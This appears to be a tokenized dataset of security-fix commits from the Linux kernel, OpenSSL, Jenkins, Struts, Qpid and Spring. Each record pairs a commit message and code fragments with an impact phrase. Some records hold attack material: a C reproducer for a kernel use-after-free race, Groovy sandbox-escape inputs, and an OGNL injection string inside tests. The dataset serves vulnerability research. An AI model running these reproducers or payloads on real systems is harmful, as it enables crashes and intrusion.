{"contents": ["QPID-7271:", "[Java", "Broker]", "Improve", "exception", "handling", "(fix", ")"], "code_tokens": ["catch", "(", "IllegalArgumentException", "e", ")", "{", "throw", "new", "SaslException", "(", "\"", "Error", "processing", "SASL", "response", ":", "\"", "+", "e", ".", "getMessage", "(", "),", "e", ")", ";", "}</s>"], "docstring_tokens": ["disable", "the", "PLAIN", "mechanism", "for", "their", "authentication", "manager"]}
{"contents": ["[PATCH]", "32bit", "integer", "overflow", "in", "invalidate_inode_pages2()", "Fix", "a", "32", "bit", "integer", "overflow", "in", "invalidate_inode_pages2_range.", "Signed-off-by:", "Andrew", "Morton", "<akpm@osdl.org>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@osdl.org>"], "code_tokens": ["(", "loff_t", ")", "page_index", "<", "<", "PAGE_CACHE_SHIFT", ",", "(", "loff_t", ")", "(", "end", "-", "page_index", "+", "1", ")", "(", "loff_t", ")", "page_index", "<", "<", "PAGE_CACHE_SHIFT", ",</s>page_index", "<", "<", "PAGE_CACHE_SHIFT", ",", "(", "end", "-", "page_index", "+", "1", ")", "page_index", "<", "<", "PAGE_CACHE_SHIFT", ","], "docstring_tokens": ["overflow", "a", "buffer", "and", "cause", "the", "server", "to", "crash"]}
{"contents": ["QPID-8273:", "[Broker-J]", "Set", "notify", "work", "on", "channel", "reaching", "end-of-read-stream"], "code_tokens": ["_protocolEngine", ".", "notifyWork", "(", ");</s>"], "docstring_tokens": ["crash", "the", "broker", "instance"]}
{"contents": ["net:", "Fix", "use", "after", "free", "in", "the", "recvmmsg", "exit", "path", "The", "syzkaller", "fuzzer", "hit", "the", "following", "use-after-free:", "Call", "Trace:", "[<ffffffff8175ea0e>]", "__asan_report_load8_noabort+0x3e/0x40", "mm/kasan/report.c:295", "[<ffffffff851cc31a>]", "__sys_recvmmsg+0x6fa/0x7f0", "net/socket.c:2261", "[<", "inline", ">]", "SYSC_recvmmsg", "net/socket.c:2281", "[<ffffffff851cc57f>]", "SyS_recvmmsg+0x16f/0x180", "net/socket.c:2270", "[<ffffffff86332bb6>]", "entry_SYSCALL_64_fastpath+0x16/0x7a", "arch/x86/entry/entry_64.S:185", "And,", "as", "Dmitry", "rightly", "assessed,", "that", "is", "because", "we", "can", "drop", "the", "reference", "and", "then", "touch", "it", "when", "the", "underlying", "recvmsg", "calls", "return", "some", "packets", "and", "then", "hit", "an", "error,", "which", "will", "make", "recvmmsg", "to", "set", "sock->sk->sk_err,", "oops,", "fix", "it.", "Reported-and-Tested-by:", "Dmitry", "Vyukov", "<dvyukov@google.com>", "Cc:", "Alexander", "Potapenko", "<glider@google.com>", "Cc:", "Eric", "Dumazet", "<edumazet@google.com>", "Cc:", "Kostya", "Serebryany", "<kcc@google.com>", "Cc:", "Sasha", "Levin", "<sasha.levin@oracle.com>", "Fixes:", "a2e2725541fa", "(\"net:", "Introduce", "recvmmsg", "socket", "syscall\")", "http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com", "Signed-off-by:", "Arnaldo", "Carvalho", "de", "Melo", "<acme@redhat.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["goto", "out_put", ";", "if", "(", "datagrams", "=", "=", "0", ")", "{", "datagrams", "=", "err", ";", "goto", "out_put", ";", "}", "/", "*", "*", "We", "may", "return", "less", "entries", "than", "requested", "(", "vlen", ")", "if", "the", "*", "sock", "is", "non", "block", "and", "there", "aren", "'", "t", "enough", "datagrams", ".", "..", "*", "/", "if", "(", "err", "!", "=", "-", "EAGAIN", ")", "{", "*", ".", "..", "or", "if", "recvmsg", "returns", "an", "error", "after", "we", "*", "received", "some", "datagrams", ",", "where", "we", "record", "the", "*", "error", "to", "return", "on", "the", "next", "call", "or", "if", "the", "*", "app", "asks", "about", "it", "using", "getsockopt", "(", "SO_ERROR", ")", ".", "sock", "-", ">", "sk", "-", ">", "sk_err", "=", "-", "err", ";", "out_put", ":", "fput_light", "(", "sock", "-", ">", "file", ",", "fput_needed", ")", ";", "return", "datagrams", ";</s>out_put", ":", "fput_light", "(", "sock", "-", ">", "file", ",", "fput_needed", ")", ";", "return", "datagrams", ";", "if", "(", "datagrams", "!", "=", "0", ")", "{", "*", "We", "may", "return", "less", "entries", "than", "requested", "(", "vlen", ")", "if", "the", "*", "sock", "is", "non", "block", "and", "there", "aren", "'", "t", "enough", "datagrams", ".", "..", "if", "(", "err", "!", "=", "-", "EAGAIN", ")", "{", "/", "*", "*", ".", "..", "or", "if", "recvmsg", "returns", "an", "error", "after", "we", "*", "received", "some", "datagrams", ",", "where", "we", "record", "the", "*", "error", "to", "return", "on", "the", "next", "call", "or", "if", "the", "*", "app", "asks", "about", "it", "using", "getsockopt", "(", "SO_ERROR", ")", ".", "*", "/", "sock", "-", ">", "sk", "-", ">", "sk_err", "=", "-", "err", ";", "}", "return", "datagrams", ";", "return", "err", ";"], "docstring_tokens": ["execute", "arbitrary", "code", "on", "the", "system"]}
{"contents": ["Don't", "allow", "read/write", "after", "fatal", "error", "OpenSSL", "1.0.2", "(starting", "from", "version", "1.0.2b)", "introduced", "an", "\"error", "state\"", "mechanism.", "The", "intent", "was", "that", "if", "a", "fatal", "error", "occurred", "during", "a", "handshake", "then", "OpenSSL", "would", "move", "into", "the", "error", "state", "and", "would", "immediately", "fail", "if", "you", "attempted", "to", "continue", "the", "handshake.", "This", "works", "as", "designed", "for", "the", "explicit", "handshake", "functions", "(SSL_do_handshake(),", "SSL_accept()", "and", "SSL_connect()),", "however", "due", "to", "a", "bug", "it", "does", "not", "work", "correctly", "if", "SSL_read()", "or", "SSL_write()", "is", "called", "directly.", "In", "that", "scenario,", "if", "the", "handshake", "fails", "then", "a", "fatal", "error", "will", "be", "returned", "in", "the", "initial", "function", "call.", "If", "SSL_read()/SSL_write()", "is", "subsequently", "called", "by", "the", "application", "for", "the", "same", "SSL", "object", "then", "it", "will", "succeed", "and", "the", "data", "is", "passed", "without", "being", "decrypted/encrypted", "directly", "from", "the", "SSL/TLS", "record", "layer.", "In", "order", "to", "exploit", "this", "issue", "an", "attacker", "would", "have", "to", "trick", "an", "application", "into", "behaving", "incorrectly", "by", "issuing", "an", "SSL_read()/SSL_write()", "after", "having", "already", "received", "a", "fatal", "error.", "Thanks", "to", "David", "Benjamin", "(Google)", "for", "reporting", "this", "issue", "and", "suggesting", "this", "fix.", "Reviewed-by:", "Rich", "Salz", "<rsalz@openssl.org>"], "code_tokens": ["#", "define", "SSL_ST_ERR", "(", "0x05", "|", "SSL_ST_INIT", ")</s>#", "define", "SSL_ST_ERR", "0x05"], "docstring_tokens": ["bypass", "the", "decryption", "or", "encryption", "process", "and", "perform", "unauthorized", "actions"]}
{"contents": ["[SECURITY-1295]", "Secure", "the", "script", "check", "in", "GroovyParser."], "code_tokens": ["<", "dependency", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", ".", "plugins", "<", "/", "groupId", ">", "<", "artifactId", ">", "script", "-", "security", "<", "/", "artifactId", ">", "<", "version", ">", "1", ".", "50", "<", "/", "version", ">", "<", "/", "dependency", ">", "import", "org", ".", "kohsuke", ".", "stapler", ".", "interceptor", ".", "RequirePOST", ";", "@", "RequirePOST", "import", "org", ".", "jenkinsci", ".", "plugins", ".", "scriptsecurity", ".", "sandbox", ".", "groovy", ".", "GroovySandbox", ";", "GroovyShell", "shell", "=", "new", "GroovyShell", "(", "GroovySandbox", ".", "createSecureClassLoader", "(", "WarningsDescriptor", ".", "class", ".", "getClassLoader", "(", "))", ",", "binding", ",", "GroovySandbox", ".", "createSecureCompilerConfiguration", "(", "))", ";", "import", "static", "org", ".", "hamcrest", ".", "Matchers", ".", "*;", "@", "Issue", "(", "\"", "SECURITY", "-", "1295", "\"", ")", "@", "Test", "public", "void", "blockASTTest", "(", ")", "throws", "Exception", "{", "DescriptorImpl", "d", "=", "createDescriptor", "(", ");", "assertThat", "(", "d", ".", "doCheckScript", "(", "\"", "import", "groovy", ".", "transform", ".", "*\\", "n", "\"", "\"", "import", "jenkins", ".", "model", ".", "Jenkins", "\\", "n", "\"", "\"", "import", "hudson", ".", "model", ".", "FreeStyleProject", "\\", "n", "\"", "\"", "@", "ASTTest", "(", "value", "=", "{", "assert", "Jenkins", ".", "getInstance", "(", ").", "createProject", "(", "FreeStyleProject", ".", "class", ",", "\\", "\"", "should", "-", "not", "-", "exist", "\\", "\")", "}", ")\\", "n", "\"", "\"", "@", "Field", "int", "x", "\\", "n", "\"", "\"", "echo", "'", "hello", "'", "\\", "n", "\"", ").", "toString", "(", "),", "containsString", "(", "\"", "Annotation", "ASTTest", "cannot", "be", "used", "in", "the", "sandbox", "\"", "))", ";", "}", "@", "Issue", "(", "\"", "SECURITY", "-", "1295", "\"", ")", "@", "Test", "public", "void", "blockGrab", "(", ")", "throws", "Exception", "{", "DescriptorImpl", "d", "=", "createDescriptor", "(", ");", "assertThat", "(", "d", ".", "doCheckScript", "(", "\"@", "Grab", "(", "group", "=", "'", "foo", "'", ",", "module", "=", "'", "bar", "'", ",", "version", "=", "'", "1", ".", "0", "'", ")\\", "ndef", "foo", "\\", "n", "\"", ").", "toString", "(", "),", "containsString", "(", "\"", "Annotation", "Grab", "cannot", "be", "used", "in", "the", "sandbox", "\"", "))", ";", "}</s><", "dependency", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", ".", "plugins", "<", "/", "groupId", ">", "<", "artifactId", ">", "script", "-", "security", "<", "/", "artifactId", ">", "<", "version", ">", "1", ".", "36", "<", "/", "version", ">", "<", "/", "dependency", ">", "GroovyShell", "shell", "=", "new", "GroovyShell", "(", "WarningsDescriptor", ".", "class", ".", "getClassLoader", "(", "),", "binding", ")", ";"], "docstring_tokens": ["information", "disclosure", "(for", "example", "values", "of", "environment", "variables)"]}
{"contents": ["block:", "fix", "use-after-free", "in", "sys_ioprio_get()", "get_task_ioprio()", "accesses", "the", "task->io_context", "without", "holding", "the", "task", "lock", "and", "thus", "can", "race", "with", "exit_io_context(),", "leading", "to", "a", "use-after-free.", "The", "reproducer", "below", "hits", "this", "within", "a", "few", "seconds", "on", "my", "4-core", "QEMU", "VM:", "#define", "_GNU_SOURCE", "#include", "<assert.h>", "#include", "<unistd.h>", "#include", "<sys/syscall.h>", "#include", "<sys/wait.h>", "int", "main(int", "argc,", "char", "**argv)", "{", "pid_t", "pid,", "child;", "long", "nproc,", "i;", "/*", "ioprio_set(IOPRIO_WHO_PROCESS,", "0,", "IOPRIO_PRIO_VALUE(IOPRIO_CLASS_IDLE,", "0));", "*/", "syscall(SYS_ioprio_set,", "1,", "0,", "0x6000);", "nproc", "=", "sysconf(_SC_NPROCESSORS_ONLN);", "for", "(i", "=", "0;", "i", "<", "nproc;", "i++)", "{", "pid", "=", "fork();", "assert(pid", "!=", "-1);", "if", "(pid", "==", "0)", "{", "for", "(;;)", "{", "pid", "=", "fork();", "assert(pid", "!=", "-1);", "if", "(pid", "==", "0)", "{", "_exit(0);", "}", "else", "{", "child", "=", "wait(NULL);", "assert(child", "==", "pid);", "}", "}", "}", "pid", "=", "fork();", "assert(pid", "!=", "-1);", "if", "(pid", "==", "0)", "{", "for", "(;;)", "{", "/*", "ioprio_get(IOPRIO_WHO_PGRP,", "0);", "*/", "syscall(SYS_ioprio_get,", "2,", "0);", "}", "}", "}", "for", "(;;)", "{", "/*", "ioprio_get(IOPRIO_WHO_PGRP,", "0);", "*/", "syscall(SYS_ioprio_get,", "2,", "0);", "}", "return", "0;", "}", "This", "gets", "us", "KASAN", "dumps", "like", "this:", "[", "35.526914]", "==================================================================", "[", "35.530009]", "BUG:", "KASAN:", "out-of-bounds", "in", "get_task_ioprio+0x7b/0x90", "at", "addr", "ffff880066f34e6c", "[", "35.530009]", "Read", "of", "size", "2", "by", "task", "ioprio-gpf/363", "[", "35.530009]", "=============================================================================", "[", "35.530009]", "BUG", "blkdev_ioc", "(Not", "tainted):", "kasan:", "bad", "access", "detected", "[", "35.530009]", "-----------------------------------------------------------------------------", "[", "35.530009]", "Disabling", "lock", "debugging", "due", "to", "kernel", "taint", "[", "35.530009]", "INFO:", "Allocated", "in", "create_task_io_context+0x2b/0x370", "age=0", "cpu=0", "pid=360", "[", "35.530009]", "___slab_alloc+0x55d/0x5a0", "[", "35.530009]", "__slab_alloc.isra.20+0x2b/0x40", "[", "35.530009]", "kmem_cache_alloc_node+0x84/0x200", "[", "35.530009]", "create_task_io_context+0x2b/0x370", "[", "35.530009]", "get_task_io_context+0x92/0xb0", "[", "35.530009]", "copy_process.part.8+0x5029/0x5660", "[", "35.530009]", "_do_fork+0x155/0x7e0", "[", "35.530009]", "SyS_clone+0x19/0x20", "[", "35.530009]", "do_syscall_64+0x195/0x3a0", "[", "35.530009]", "return_from_SYSCALL_64+0x0/0x6a", "[", "35.530009]", "INFO:", "Freed", "in", "put_io_context+0xe7/0x120", "age=0", "cpu=0", "pid=1060", "[", "35.530009]", "__slab_free+0x27b/0x3d0", "[", "35.530009]", "kmem_cache_free+0x1fb/0x220", "[", "35.530009]", "put_io_context+0xe7/0x120", "[", "35.530009]", "put_io_context_active+0x238/0x380", "[", "35.530009]", "exit_io_context+0x66/0x80", "[", "35.530009]", "do_exit+0x158e/0x2b90", "[", "35.530009]", "do_group_exit+0xe5/0x2b0", "[", "35.530009]", "SyS_exit_group+0x1d/0x20", "[", "35.530009]", "entry_SYSCALL_64_fastpath+0x1a/0xa4", "[", "35.530009]", "INFO:", "Slab", "0xffffea00019bcd00", "objects=20", "used=4", "fp=0xffff880066f34ff0", "flags=0x1fffe0000004080", "[", "35.530009]", "INFO:", "Object", "0xffff880066f34e58", "@offset=3672", "fp=0x0000000000000001", "[", "35.530009]", "==================================================================", "Fix", "it", "by", "grabbing", "the", "task", "lock", "while", "we", "poke", "at", "the", "io_context.", "Cc:", "stable@vger.kernel.org", "Reported-by:", "Dmitry", "Vyukov", "<dvyukov@google.com>", "Signed-off-by:", "Omar", "Sandoval", "<osandov@fb.com>", "Signed-off-by:", "Jens", "Axboe", "<axboe@fb.com>"], "code_tokens": ["task_lock", "(", "p", ")", ";", "task_unlock", "(", "p", ")", ";</s>"], "docstring_tokens": ["gain", "privileges", "or", "cause", "a", "denial", "of", "service", "(use-after-free", ")"]}
{"contents": ["hfsplus:", "Fix", "potential", "buffer", "overflows", "Commit", "ec81aecb2966", "(\"hfs:", "fix", "a", "potential", "buffer", "overflow\")", "fixed", "a", "few", "potential", "buffer", "overflows", "in", "the", "hfs", "filesystem.", "But", "as", "Timo", "Warns", "pointed", "out,", "these", "changes", "also", "need", "to", "be", "made", "on", "the", "hfsplus", "filesystem", "as", "well.", "Reported-by:", "Timo", "Warns", "<warns@pre-sense.de>", "Acked-by:", "WANG", "Cong", "<amwang@redhat.com>", "Cc:", "Alexey", "Khoroshilov", "<khoroshilov@ispras.ru>", "Cc:", "Miklos", "Szeredi", "<mszeredi@suse.cz>", "Cc:", "Sage", "Weil", "<sage@newdream.net>", "Cc:", "Eugene", "Teo", "<eteo@redhat.com>", "Cc:", "Roman", "Zippel", "<zippel@linux-m68k.org>", "Cc:", "Al", "Viro", "<viro@zeniv.linux.org.uk>", "Cc:", "Christoph", "Hellwig", "<hch@lst.de>", "Cc:", "Alexey", "Dobriyan", "<adobriyan@gmail.com>", "Cc:", "Dave", "Anderson", "<anderson@redhat.com>", "Cc:", "stable", "<stable@vger.kernel.org>", "Cc:", "Andrew", "Morton", "<akpm@linux-foundation.org>", "Signed-off-by:", "Greg", "Kroah-Hartman", "<gregkh@linuxfoundation.org>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["if", "(", "src_fd", ".", "entrylength", ">", "sizeof", "(", "entry", ")", "|", "|", "src_fd", ".", "entrylength", "<", "0", ")", "{", "err", "=", "-", "EIO", ";", "goto", "out", ";", "}", "if", "(", "fd", ".", "entrylength", ">", "sizeof", "(", "entry", ")", "|", "|", "fd", ".", "entrylength", "<", "0", ")", "{", "err", "=", "-", "EIO", ";", "goto", "out", ";", "}", "if", "(", "fd", ".", "entrylength", ">", "sizeof", "(", "entry", ")", "|", "|", "fd", ".", "entrylength", "<", "0", ")", "{", "err", "=", "-", "EIO", ";", "goto", "out", ";", "}</s>"], "docstring_tokens": ["overflow", "a", "buffer", "and", "execute", "arbitrary", "code", "on", "the", "system", "or", "cause", "the", "application", "to", "crash"]}
{"contents": ["Introduces", "new", "callMethod()", "function", "to", "be", "used", "to", "execute", "actions"], "code_tokens": ["methodResult", "=", "ognlUtil", ".", "callMethod", "(", "methodName", "+", "\"", "()", "\",", "getStack", "(", ").", "getContext", "(", "),", "action", ")", ";", "methodResult", "=", "ognlUtil", ".", "callMethod", "(", "altMethodName", ",", "getStack", "(", ").", "getContext", "(", "),", "action", ")", ";", "if", "(", "isArithmeticExpression", "(", "tree", ",", "context", ")", ")", "{", "throw", "new", "OgnlException", "(", "\"", "Arithmetic", "expressions", "cannot", "be", "used", "as", "parameter", "name", "\"", ");", "}", "private", "boolean", "isArithmeticExpression", "(", "Object", "tree", ",", "Map", "<", "String", ",", "Object", ">", "context", ")", "throws", "OgnlException", "{", "if", "(", "tree", "instanceof", "SimpleNode", ")", "{", "SimpleNode", "node", "=", "(", "SimpleNode", ")", "tree", ";", "OgnlContext", "ognlContext", "=", "null", ";", "if", "(", "context", "!", "=", "null", "&", "&", "context", "instanceof", "OgnlContext", ")", "{", "ognlContext", "=", "(", "OgnlContext", ")", "context", ";", "}", "return", "node", ".", "isOperation", "(", "ognlContext", ")", ";", "}", "return", "false", ";", "}", "private", "boolean", "isSimpleMethod", "(", "Object", "tree", ",", "Map", "<", "String", ",", "Object", ">", "context", ")", "throws", "OgnlException", "{", "if", "(", "tree", "instanceof", "SimpleNode", ")", "{", "SimpleNode", "node", "=", "(", "SimpleNode", ")", "tree", ";", "OgnlContext", "ognlContext", "=", "null", ";", "if", "(", "context", "!", "=", "null", "&", "&", "context", "instanceof", "OgnlContext", ")", "{", "ognlContext", "=", "(", "OgnlContext", ")", "context", ";", "}", "return", "node", ".", "isSimpleMethod", "(", "ognlContext", ")", "&", "&", "!", "node", ".", "isChain", "(", "ognlContext", ")", ";", "}", "return", "false", ";", "}", "public", "Object", "callMethod", "(", "final", "String", "name", ",", "final", "Map", "<", "String", ",", "Object", ">", "context", ",", "final", "Object", "root", ")", "throws", "OgnlException", "{", "return", "compileAndExecuteMethod", "(", "name", ",", "context", ",", "new", "OgnlTask", "<", "Object", ">", "()", "{", "public", "Object", "execute", "(", "Object", "tree", ")", "throws", "OgnlException", "{", "return", "Ognl", ".", "getValue", "(", "tree", ",", "context", ",", "root", ")", ";", "}", "}", ");", "}", "private", "<", "T", ">", "Object", "compileAndExecuteMethod", "(", "String", "expression", ",", "Map", "<", "String", ",", "Object", ">", "context", ",", "OgnlTask", "<", "T", ">", "task", ")", "throws", "OgnlException", "{", "Object", "tree", ";", "if", "(", "enableExpressionCache", ")", "{", "tree", "=", "expressions", ".", "get", "(", "expression", ")", ";", "if", "(", "tree", "=", "=", "null", ")", "{", "tree", "=", "Ognl", ".", "parseExpression", "(", "expression", ")", ";", "checkSimpleMethod", "(", "tree", ",", "context", ")", ";", "}", "}", "else", "{", "tree", "=", "Ognl", ".", "parseExpression", "(", "expression", ")", ";", "checkSimpleMethod", "(", "tree", ",", "context", ")", ";", "}", "final", "T", "exec", "=", "task", ".", "execute", "(", "tree", ")", ";", "/", "/", "if", "cache", "is", "enabled", "and", "it", "'", "s", "a", "valid", "expression", ",", "puts", "it", "in", "if", "(", "enableExpressionCache", ")", "{", "expressions", ".", "putIfAbsent", "(", "expression", ",", "tree", ")", ";", "}", "return", "exec", ";", "}", "private", "void", "checkSimpleMethod", "(", "Object", "tree", ",", "Map", "<", "String", ",", "Object", ">", "context", ")", "throws", "OgnlException", "{", "if", "(", "!", "isSimpleMethod", "(", "tree", ",", "context", ")", ")", "{", "throw", "new", "OgnlException", "(", "\"", "It", "isn", "'", "t", "a", "simple", "method", "which", "can", "be", "called", "!", "\")", ";", "}", "}", "public", "void", "testCallMethod", "(", ")", "throws", "Exception", "{", "Foo", "foo", "=", "new", "Foo", "(", ");", "Exception", "expected", "=", "null", ";", "try", "{", "ognlUtil", ".", "callMethod", "(", "\"#", "booScope", "=", "@", "myclass", "@", "DEFAULT_SCOPE", ",", "#", "bootScope", ".", "init", "(", ")\"", ",", "ognlUtil", ".", "createDefaultContext", "(", "foo", ")", ",", "foo", ")", ";", "fail", "(", ");", "}", "catch", "(", "OgnlException", "e", ")", "{", "expected", "=", "e", ";", "}", "assertNotNull", "(", "expected", ")", ";", "assertSame", "(", "OgnlException", ".", "class", ",", "expected", ".", "getClass", "(", "))", ";", "assertEquals", "(", "expected", ".", "getMessage", "(", "),", "\"", "It", "isn", "'", "t", "a", "simple", "method", "which", "can", "be", "called", "!", "\")", ";", "}</s>methodResult", "=", "ognlUtil", ".", "getValue", "(", "methodName", "+", "\"", "()", "\",", "getStack", "(", ").", "getContext", "(", "),", "action", ")", ";", "methodResult", "=", "ognlUtil", ".", "getValue", "(", "altMethodName", ",", "getStack", "(", ").", "getContext", "(", "),", "action", ")", ";"], "docstring_tokens": ["bypass", "internal", "security", "mechanism", "and", "redirect", "the", "victim", "to", "an", "arbitrary", "site"]}
{"contents": ["DATAJPA-1519", "-", "Polishing.", "Moved", "the", "registration", "of", "the", "escape(\u2026)", "SpEL", "function", "into", "an", "EvaluationContextExtension", "to", "avoid", "the", "need", "for", "a", "dedicated", "static", "method", "on", "EscapeCharacter.", "Moved", "Escape", "Character", "in", "the", "\u2026.repository.query", "package", "to", "remove", "the", "package", "cycle."], "code_tokens": ["import", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "support", ".", "JpaEvaluationContextExtension", ";", "private", "static", "final", "String", "ESCAPE_CHARACTER_PROPERTY", "=", "\"", "escapeCharacter", "\"", ";", "if", "(", "AnnotationRepositoryConfigurationSource", ".", "class", ".", "isInstance", "(", "source", ")", ")", "{", "return", "(", "Character", ")", "AnnotationRepositoryConfigurationSource", ".", "class", "/", "/", ".", "cast", "(", "source", ")", "/", "/", ".", "getAttributes", "(", ")", "/", "/", ".", "get", "(", "ESCAPE_CHARACTER_PROPERTY", ")", ";", "String", "attribute", "=", "source", ".", "getAttribute", "(", "ESCAPE_CHARACTER_PROPERTY", ")", ";", "return", "attribute", "=", "=", "null", "?", "null", ":", "attribute", ".", "toCharArray", "(", ")[", "0", "]", ";", "/", "/", "EvaluationContextExtension", "for", "JPA", "specific", "SpEL", "functions", "Character", "escapeCharacter", "=", "getEscapeCharacter", "(", "config", ")", ";", "BeanDefinitionBuilder", "builder", "=", "BeanDefinitionBuilder", ".", "rootBeanDefinition", "(", "JpaEvaluationContextExtension", ".", "class", ")", ";", "builder", ".", "addConstructorArgValue", "(", "escapeCharacter", "=", "=", "null", "?", "'", "\\\\", "'", ":", "escapeCharacter", ")", ";", "registerIfNotAlreadyRegistered", "(", "builder", ".", "getBeanDefinition", "(", "),", "registry", ",", "JpaEvaluationContextExtension", ".", "class", ".", "getName", "(", "),", "source", ")", ";", "package", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "query", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "List", ";", "*", "A", "value", "type", "encapsulating", "an", "escape", "character", "for", "LIKE", "queries", "and", "the", "actually", "usage", "of", "it", "in", "escaping", "*", "{", "@", "link", "String", "}", "s", ".", "*", "@", "author", "Oliver", "Drotbohm", "private", "static", "final", "List", "<", "String", ">", "TO_REPLACE", "=", "Arrays", ".", "asList", "(", "\"", "_", "\"", ",", "\"", "%\"", ");", "/", "**", "*", "Escapes", "all", "special", "like", "characters", "(", "{@", "code", "_", "}", ",", "{", "@", "code", "%", "})", "using", "the", "configured", "escape", "character", ".", "*", "*", "@", "param", "value", "must", "not", "be", "{", "@", "literal", "null", "}", ".", "*", "@", "return", "*", "/", "String", "result", "=", "value", ";", "for", "(", "String", "toReplace", ":", "TO_REPLACE", ")", "{", "result", "=", "result", ".", "replace", "(", "toReplace", ",", "value", "+", "toReplace", ")", ";", "}", "return", "result", ";", "/", "*", "*", "Copyright", "2019", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "support", ";", "import", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "query", ".", "EscapeCharacter", ";", "import", "org", ".", "springframework", ".", "data", ".", "repository", ".", "query", ".", "spi", ".", "EvaluationContextExtension", ";", "import", "org", ".", "springframework", ".", "data", ".", "repository", ".", "query", ".", "spi", ".", "EvaluationContextExtensionSupport", ";", "/", "**", "*", "{", "@", "link", "EvaluationContextExtension", "}", "to", "register", "{", "@", "link", "EscapeCharacter", "}", "as", "root", "object", "to", "essentially", "expose", "an", "*", "{", "@", "code", "expose", "(", "\u2026)", "}", "function", "to", "SpEL", ".", "*", "*", "@", "author", "Oliver", "Drotbohm", "*", "/", "public", "class", "JpaEvaluationContextExtension", "extends", "EvaluationContextExtensionSupport", "{", "private", "final", "EscapeCharacter", "character", ";", "/", "**", "*", "Creates", "a", "new", "{", "@", "link", "JpaEvaluationContextExtension", "}", "for", "the", "given", "escape", "character", ".", "*", "*", "@", "param", "escapeCharacter", "the", "character", "to", "be", "used", "to", "escape", "parameters", "for", "LIKE", "expression", ".", "*", "/", "public", "JpaEvaluationContextExtension", "(", "char", "escapeCharacter", ")", "{", "this", ".", "character", "=", "EscapeCharacter", ".", "of", "(", "escapeCharacter", ")", ";", "}", "/", "*", "*", "(", "non", "-", "Javadoc", ")", "*", "@", "see", "org", ".", "springframework", ".", "data", ".", "spel", ".", "spi", ".", "EvaluationContextExtension", "#", "getExtensionId", "(", ")", "*", "/", "@", "Override", "public", "String", "getExtensionId", "(", ")", "{", "return", "\"", "jpa", "\"", ";", "}", "/", "*", "*", "(", "non", "-", "Javadoc", ")", "*", "@", "see", "org", ".", "springframework", ".", "data", ".", "spel", ".", "spi", ".", "EvaluationContextExtension", "#", "getRootObject", "(", ")", "*", "/", "@", "Override", "public", "Object", "getRootObject", "(", ")", "{", "return", "character", ";", "}", "}", "@", "@", "-", "30", ",", "6", "+", "30", ",", "7", "@", "@", "import", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "query", ".", "EscapeCharacter", ";", "import", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "query", ".", "EscapeCharacter", ";", "http", "\\", ":/", "/", "www", ".", "springframework", ".", "org", "/", "schema", "/", "data", "/", "jpa", "/", "spring", "-", "jpa", "-", "1", ".", "11", ".", "xsd", "=", "org", "/", "springframework", "/", "data", "/", "jpa", "/", "repository", "/", "config", "/", "spring", "-", "jpa", "-", "1", ".", "11", ".", "xsd", "http", "\\", ":/", "/", "www", ".", "springframework", ".", "org", "/", "schema", "/", "data", "/", "jpa", "/", "spring", "-", "jpa", ".", "xsd", "=", "org", "/", "springframework", "/", "data", "/", "jpa", "/", "repository", "/", "config", "/", "spring", "-", "jpa", "-", "1", ".", "11", ".", "xsd", "@", "@", "-", "0", ",", "0", "+", "1", ",", "65", "@", "@", "<", "?", "xml", "version", "=", "\"", "1", ".", "0", "\"", "encoding", "=", "\"", "UTF", "-", "8", "\"", "?", ">", "<", "xsd", ":", "schema", "xmlns", "=", "\"", "http", ":", "//", "www", ".", "springframework", ".", "org", "/", "schema", "/", "data", "/", "jpa", "\"", "xmlns", ":", "xsd", "=", "\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "2001", "/", "XMLSchema", "\"", "xmlns", ":", "tool", "=", "\"", "http", ":", "//", "www", ".", "springframework", ".", "org", "/", "schema", "/", "tool", "\"", "xmlns", ":", "context", "=", "\"", "http", ":", "//", "www", ".", "springframework", ".", "org", "/", "schema", "/", "context", "\"", "xmlns", ":", "repository", "=", "\"", "http", ":", "//", "www", ".", "springframework", ".", "org", "/", "schema", "/", "data", "/", "repository", "\"", "targetNamespace", "=", "\"", "http", ":", "//", "www", ".", "springframework", ".", "org", "/", "schema", "/", "data", "/", "jpa", "\"", "elementFormDefault", "=", "\"", "qualified", "\"", "attributeFormDefault", "=", "\"", "unqualified", "\"", ">", "<", "xsd", ":", "import", "namespace", "=", "\"", "http", ":", "//", "www", ".", "springframework", ".", "org", "/", "schema", "/", "tool", "\"", "/", ">", "<", "xsd", ":", "import", "namespace", "=", "\"", "http", ":", "//", "www", ".", "springframework", ".", "org", "/", "schema", "/", "context", "\"", "/", ">", "<", "xsd", ":", "import", "namespace", "=", "\"", "http", ":", "//", "www", ".", "springframework", ".", "org", "/", "schema", "/", "data", "/", "repository", "\"", "schemaLocation", "=", "\"", "https", ":", "//", "www", ".", "springframework", ".", "org", "/", "schema", "/", "data", "/", "repository", "/", "spring", "-", "repository", ".", "xsd", "\"", "/", ">", "<", "xsd", ":", "element", "name", 